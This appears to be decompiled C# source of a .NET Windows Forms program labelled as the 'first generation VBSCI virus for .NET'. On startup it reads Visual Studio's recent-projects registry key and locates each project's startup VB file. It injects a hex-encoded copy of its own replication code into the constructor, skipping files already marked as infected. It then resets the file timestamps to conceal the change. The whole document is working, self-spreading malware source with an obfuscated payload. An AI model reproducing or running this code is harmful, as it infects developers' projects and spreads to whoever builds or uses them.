using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsApplication2;

public class Form1 : Form
{
	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	private IContainer components;

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label1 == null)
			{
			}
			_Label1 = value;
			if (_Label1 != null)
			{
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	public Form1()
	{
		InitializeComponent();
		string text = "44696D20532041732053797374656D2E494F2E53747265616D5772697465720D";
		text += "0A44696D204F2C205020417320446174650D0A44696D2052204173204D696372";
		text += "6F736F66742E57696E33322E52656769737472794B65790D0A52203D204D6963";
		text += "726F736F66742E57696E33322E52656769737472792E43757272656E74557365";
		text += "722E4F70656E5375624B65792822536F6674776172655C4D6963726F736F6674";
		text += "5C56697375616C53747564696F5C372E305C50726F6A6563744D52554C697374";
		text += "22290D0A496620522E56616C7565436F756E74203D2030205468656E20476F54";
		text += "6F2049540D0A466F722058203D203120546F204C656E284A2920537465702032";
		text += "0D0A4C203D204C20262043687228222648222026204D6964284A2C20582C2032";
		text += "29290D0A4E6578740D0A4D203D20224A203D2022202620436872283334290D0A";
		text += "466F722058203D203120546F204C656E284A2920537465702036340D0A496620";
		text += "58202B203634203C204C656E284A29205468656E0D0A4D203D204D2026204D69";
		text += "64284A2C20582C2036342920262043687228333429202620766243724C662026";
		text += "20224A203D204A20262022202620436872283334290D0A456C73650D0A4D203D";
		text += "204D2026204D6964284A2C20582C203634292026204368722833342920262076";
		text += "6243724C660D0A456E642049660D0A4E6578740D0A466F722058203D20312054";
		text += "6F20522E56616C7565436F756E740D0A41203D20522E47657456616C75652822";
		text += "46696C652220262058290D0A49662053797374656D2E494F2E46696C652E4578";
		text += "69737473284129203D2054727565205468656E0D0A46696C654F70656E28312C";
		text += "20412C204F70656E4D6F64652E496E7075742C204F70656E4163636573732E52";
		text += "6561642C204F70656E53686172652E4C6F636B5772697465290D0A466F722059";
		text += "203D203120546F20320D0A42203D2046696C6553797374656D2E4C696E65496E";
		text += "7075742831290D0A4E6578740D0A46696C65436C6F73652831290D0A5A203D20";
		text += "496E53747228312C20422C20222E766270726F6A222C20436F6D706172654D65";
		text += "74686F642E54657874290D0A4966205A203C3E2030205468656E0D0A49203D20";
		text += "496E53747252657628422C20436872283334292C205A2C20436F6D706172654D";
		text += "6574686F642E54657874290D0A43203D204D696428422C2049202B20312C205A";
		text += "202B2036202D2049290D0A456E642049660D0A44203D204D696428412C20312C";
		text += "20496E53747252657628412C20225C222C202D312C20436F6D706172654D6574";
		text += "686F642E5465787429290D0A49662053797374656D2E494F2E46696C652E4578";
		text += "6973747328442026204329203D2054727565205468656E0D0A46696C654F7065";
		text += "6E28312C2044202620432C204F70656E4D6F64652E496E7075742C204F70656E";
		text += "4163636573732E526561642C204F70656E53686172652E4C6F636B5772697465";
		text += "290D0A446F20556E74696C20454F462831290D0A46203D2046696C6553797374";
		text += "656D2E4C696E65496E7075742831290D0A496620496E53747228312C20462C20";
		text += "22537461727475704F626A656374222C20436F6D706172654D6574686F642E54";
		text += "65787429203C3E2030205468656E0D0A46203D205265706C616365284D696428";
		text += "462C20496E53747228312C20462C20436872283334292C20436F6D706172654D";
		text += "6574686F642E5465787429292C20436872283334292C2022222C20312C202D31";
		text += "2C20436F6D706172654D6574686F642E54657874290D0A4966204C656E284629";
		text += "203C3E2030205468656E0D0A46203D204D696428462C20496E53747228462C20";
		text += "222E222C20436F6D706172654D6574686F642E5465787429202B203129202620";
		text += "222E7662220D0A4578697420446F0D0A456E642049660D0A456E642049660D0A";
		text += "4C6F6F700D0A46696C65436C6F73652831290D0A49662053797374656D2E494F";
		text += "2E46696C652E45786973747328442026204629203D2054727565205468656E0D";
		text += "0A46696C654F70656E28312C2044202620462C204F70656E4D6F64652E496E70";
		text += "75742C204F70656E4163636573732E526561642C204F70656E53686172652E4C";
		text += "6F636B5772697465290D0A446F20556E74696C20454F462831290D0A47203D20";
		text += "4720262046696C6553797374656D2E4C696E65496E7075742831292026207662";
		text += "43724C660D0A4C6F6F700D0A46696C65436C6F73652831290D0A496620496E53";
		text += "747228472C20224C7973204B6F7669636B222C20436F6D706172654D6574686F";
		text += "642E5465787429203D2030205468656E0D0A496620496E53747228472C202250";
		text += "75626C696320537562204E65772829222C20436F6D706172654D6574686F642E";
		text += "5465787429203C3E2030205468656E0D0A48203D2022456E6420537562220D0A";
		text += "4B203D202244696D20412C20422C20432C20442C20462C20472C20482C204A2C";
		text += "204B2C204C2C204D20417320537472696E6722202620766243724C6620262022";
		text += "44696D20492C204E2C20582C20592C205A20417320496E746567657222202620";
		text += "766243724C66200D0A47203D205265706C61636528472C20482C204B2026204D";
		text += "2026204C202620482C20312C2031290D0A4F203D2053797374656D2E494F2E46";
		text += "696C652E4765744C617374577269746554696D65284420262046290D0A50203D";
		text += "2053797374656D2E494F2E46696C652E4765744C61737441636365737354696D";
		text += "65284420262046290D0A53203D2053797374656D2E494F2E46696C652E437265";
		text += "61746554657874284420262046290D0A532E57726974652847290D0A532E436C";
		text += "6F736528290D0A53797374656D2E494F2E46696C652E5365744C617374577269";
		text += "746554696D652844202620462C204F290D0A53797374656D2E494F2E46696C65";
		text += "2E5365744C61737441636365737354696D652844202620462C2050290D0A456E";
		text += "642049660D0A456E642049660D0A47203D2022220D0A456E642049660D0A456E";
		text += "642049660D0A456E642049660D0A4E6578740D0A49543A0D0A522E436C6F7365";
		text += "28290D0A";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		checked
		{
			if (registryKey.ValueCount != 0)
			{
				int num = Strings.Len(text);
				string text2 = default(string);
				for (int i = 1; i <= num; i += 2)
				{
					text2 += StringType.FromChar(Strings.Chr(IntegerType.FromString("&H" + Strings.Mid(text, i, 2))));
				}
				string text3 = "J = \"";
				int num2 = Strings.Len(text);
				for (int i = 1; i <= num2; i += 64)
				{
					text3 = ((i + 64 >= Strings.Len(text)) ? (text3 + Strings.Mid(text, i, 64) + "\"" + "\r\n") : string.Concat(text3 + Strings.Mid(text, i, 64) + "\"", "\r\nJ = J & ", "\""));
				}
				int valueCount = registryKey.ValueCount;
				string text6 = default(string);
				string text8 = default(string);
				string text9 = default(string);
				for (int i = 1; i <= valueCount; i++)
				{
					string text4 = StringType.FromObject(registryKey.GetValue("File" + StringType.FromInteger(i)));
					if (!File.Exists(text4))
					{
						continue;
					}
					FileSystem.FileOpen(1, text4, (OpenMode)1, (OpenAccess)1, (OpenShare)1, -1);
					int num3 = 1;
					string text5;
					do
					{
						text5 = FileSystem.LineInput(1);
						num3++;
					}
					while (num3 <= 2);
					FileSystem.FileClose(new int[1] { 1 });
					int num4 = Strings.InStr(1, text5, ".vbproj", (CompareMethod)1);
					if (num4 != 0)
					{
						int num5 = Strings.InStrRev(text5, "\"", num4, (CompareMethod)1);
						text6 = Strings.Mid(text5, num5 + 1, num4 + 6 - num5);
					}
					string text7 = Strings.Mid(text4, 1, Strings.InStrRev(text4, "\\", -1, (CompareMethod)1));
					if (!File.Exists(text7 + text6))
					{
						continue;
					}
					FileSystem.FileOpen(1, text7 + text6, (OpenMode)1, (OpenAccess)1, (OpenShare)1, -1);
					while (!FileSystem.EOF(1))
					{
						text8 = FileSystem.LineInput(1);
						if (Strings.InStr(1, text8, "StartupObject", (CompareMethod)1) != 0)
						{
							text8 = Strings.Replace(Strings.Mid(text8, Strings.InStr(1, text8, "\"", (CompareMethod)1)), "\"", "", 1, -1, (CompareMethod)1);
							if (Strings.Len(text8) != 0)
							{
								text8 = Strings.Mid(text8, Strings.InStr(text8, ".", (CompareMethod)1) + 1) + ".vb";
								break;
							}
						}
					}
					FileSystem.FileClose(new int[1] { 1 });
					if (File.Exists(text7 + text8))
					{
						FileSystem.FileOpen(1, text7 + text8, (OpenMode)1, (OpenAccess)1, (OpenShare)1, -1);
						while (!FileSystem.EOF(1))
						{
							text9 = text9 + FileSystem.LineInput(1) + "\r\n";
						}
						FileSystem.FileClose(new int[1] { 1 });
						if (Strings.InStr(text9, "Lys Kovick", (CompareMethod)1) == 0 && Strings.InStr(text9, "Public Sub New()", (CompareMethod)1) != 0)
						{
							string text10 = "End Sub";
							string text11 = "Dim A, B, C, D, F, G, H, J, K, L, M As String\r\nDim I, N, X, Y, Z As Integer\r\n";
							text9 = Strings.Replace(text9, text10, text11 + text3 + text2 + text10, 1, 1, (CompareMethod)0);
							DateTime lastWriteTime = File.GetLastWriteTime(text7 + text8);
							DateTime lastAccessTime = File.GetLastAccessTime(text7 + text8);
							StreamWriter streamWriter = File.CreateText(text7 + text8);
							streamWriter.Write(text9);
							streamWriter.Close();
							File.SetLastWriteTime(text7 + text8, lastWriteTime);
							File.SetLastAccessTime(text7 + text8, lastAccessTime);
						}
						text9 = "";
					}
				}
			}
			registryKey.Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		Label1 = new Label();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		Point location = new Point(8, 8);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(287, 15);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		((Control)Label1).set_Text("This is the first generation VBSCI virus for .NET");
		size = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(size);
		size = new Size(304, 37);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[1] { (Control)Label1 });
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("vbsci.net");
		((Control)this).ResumeLayout(false);
	}
}
